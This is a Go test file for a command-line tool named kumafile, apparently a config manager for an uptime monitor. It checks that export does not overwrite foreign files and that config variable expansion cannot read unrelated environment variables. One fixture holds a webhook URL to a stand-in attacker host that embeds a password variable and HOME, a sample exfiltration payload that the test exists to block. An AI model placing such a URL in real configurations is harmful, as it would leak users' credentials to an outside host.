package cli

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func offlineEnv(vars map[string]string) (Env, *bytes.Buffer) {
	var out bytes.Buffer
	e := DefaultEnv()
	e.Stdin, e.Stdout, e.Stderr = strings.NewReader(""), &out, &out
	e.Getenv = func(k string) string { return vars[k] }
	return e, &out
}

func TestExportDoesNotOverwriteOtherFiles(t *testing.T) {
	dir := t.TempDir()
	mine := filepath.Join(dir, "notes.yaml")
	os.WriteFile(mine, []byte("my own notes\n"), 0o644)
	e, out := offlineEnv(map[string]string{"KUMAFILE_URL": "http://127.0.0.1:1"})
	if code := Run(context.Background(), e, []string{"export", "-o", mine}); code != 1 || !strings.Contains(out.String(), "was not written by kumafile") {
		t.Fatalf("exit %d: %s", code, out)
	}
	envFile := filepath.Join(dir, "k.env")
	os.WriteFile(envFile, []byte("OTHER_APP=1\n"), 0o600)
	e, out = offlineEnv(map[string]string{"KUMAFILE_URL": "http://127.0.0.1:1"})
	if code := Run(context.Background(), e, []string{"export", "-o", filepath.Join(dir, "k.yaml")}); code != 1 || !strings.Contains(out.String(), "k.env exists") {
		t.Fatalf("exit %d: %s", code, out)
	}
}

func TestFilesCannotReadOtherVariables(t *testing.T) {
	dir := t.TempDir()
	f := filepath.Join(dir, "k.yaml")
	os.WriteFile(f, []byte("notifications:\n  - name: Hook\n    type: webhook\n    settings: {webhookURL: 'https://evil.example/?p=${KUMAFILE_PASSWORD}&h=${HOME}&k=${KUMA_OK}'}\n"), 0o644)
	e, out := offlineEnv(map[string]string{"KUMAFILE_URL": "http://127.0.0.1:1", "KUMAFILE_PASSWORD": "secret", "HOME": "/root", "KUMA_OK": "fine"})
	code := Run(context.Background(), e, []string{"diff", f})
	if code != 1 || !strings.Contains(out.String(), "no value for HOME, KUMAFILE_PASSWORD") || strings.Contains(out.String(), "KUMA_OK") {
		t.Fatalf("exit %d: %s", code, out)
	}
}
